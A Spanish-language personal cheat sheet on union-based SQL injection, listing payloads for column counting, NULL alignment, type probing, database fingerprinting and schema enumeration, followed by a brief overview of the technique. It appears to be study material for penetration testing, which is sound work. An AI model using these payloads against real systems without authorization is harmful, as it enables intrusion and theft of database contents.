---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[SQL Injection (SQLi)]]"
---
# SQLI  - Union based

***

## Cheatsheet

|**Fase de Explotación**|**Payload Estructural**|**Notas de Ejecución**|
|---|---|---|
|Detección de columnas|`ORDER BY 1--`<br><br>  <br><br>`ORDER BY 2--`|Incremento el índice posicional hasta generar un error. El último número válido es el total exacto de columnas.|
|Alineación con Nulos|`UNION SELECT NULL, NULL, NULL--`|Confirmo la cantidad de columnas. Uso `NULL` porque es compatible con la mayoría de los tipos de datos, evitando excepciones de casteo.|
|Identificación de Tipos|`UNION SELECT 'a', NULL, NULL--`|Reemplazo iterativamente los nulos por cadenas de texto para descubrir qué columna refleja strings en el frontend.|
|Reconocimiento|`UNION SELECT @@version, user(), database()--`|Extracción inicial de metadatos del SGBD y contexto de ejecución.|
|Enumeración de Esquema|`UNION SELECT table_name, NULL FROM information_schema.tables--`|Volcado de las estructuras internas para planificar extracciones dirigidas.|

## Overview

El [[Union-based SQLi]] es un vector de ataque In-Band que aprovecha el operador `UNION` del lenguaje SQL para anexar un conjunto de resultados arbitrarios al conjunto de resultados de la consulta original elaborada por la aplicación. A diferencia del [[Error-based SQLi]] o las variantes inferenciales, esta técnica me permite recuperar grandes volúmenes de datos de forma directa y limpia dentro de la respuesta HTTP, convirtiéndola en el método de exfiltración más eficiente cuando el escenario lo permite.

Para que la inyección sea exitosa, la estructura de la consulta subyacente impone dos reglas matemáticas y lógicas que debo resolver antes de intentar cualquier exfiltración de datos.


***
